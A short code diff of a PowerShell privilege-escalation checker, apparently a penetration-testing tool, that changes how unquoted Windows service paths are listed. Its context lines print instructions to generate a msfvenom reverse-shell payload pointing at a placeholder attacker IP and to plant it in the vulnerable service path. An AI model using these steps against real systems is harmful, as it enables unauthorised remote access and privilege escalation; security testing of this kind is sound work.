@@ -117,7 +117,7 @@ Function Test-PrivEsc {
 
             Write-Host "Unquoted Service Path has been found" -ForegroundColor "Red"
 
-            $UnquotedServicePaths
+            $UnquotedServicePaths | Select-Object -Property PathName,DisplayName,Name | Format-List -GroupBy Name 
 
             Write-Host "Create a reverse shell using the following command`n`nmsfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=1337 -f exe -o msf.exe" -ForegroundColor "Yellow"
             Write-Host "Place the generated payload msf.exe into the unquoted service path location and restart the service." -ForegroundColor "Yellow"
